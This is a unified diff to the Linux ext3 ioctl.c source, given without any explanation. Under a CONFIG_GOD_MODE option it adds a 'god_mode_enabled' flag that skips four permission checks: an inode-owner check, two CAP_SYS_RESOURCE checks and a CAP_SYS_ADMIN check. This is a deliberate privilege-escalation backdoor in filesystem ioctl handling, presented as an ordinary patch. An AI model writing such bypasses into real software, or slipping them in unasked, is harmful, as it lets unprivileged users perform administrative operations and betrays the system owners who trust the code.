@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * linux/fs/ext3/ioctl.c
  *
@@ -119,7 +122,15 @@ flags_out:
 		int err;
 
 		if (!inode_owner_or_capable(inode))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		err = mnt_want_write_file(filp);
 		if (err)
@@ -203,7 +214,15 @@ setrsvsz_out:
 		int err, err2;
 
 		if (!capable(CAP_SYS_RESOURCE))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		err = mnt_want_write_file(filp);
 		if (err)
@@ -229,7 +248,15 @@ group_extend_out:
 		int err, err2;
 
 		if (!capable(CAP_SYS_RESOURCE))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		err = mnt_want_write_file(filp);
 		if (err)
@@ -258,7 +285,15 @@ group_add_out:
 		int ret = 0;
 
 		if (!capable(CAP_SYS_ADMIN))
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 		if (copy_from_user(&range, (struct fstrim_range __user *)arg,
 				   sizeof(range)))
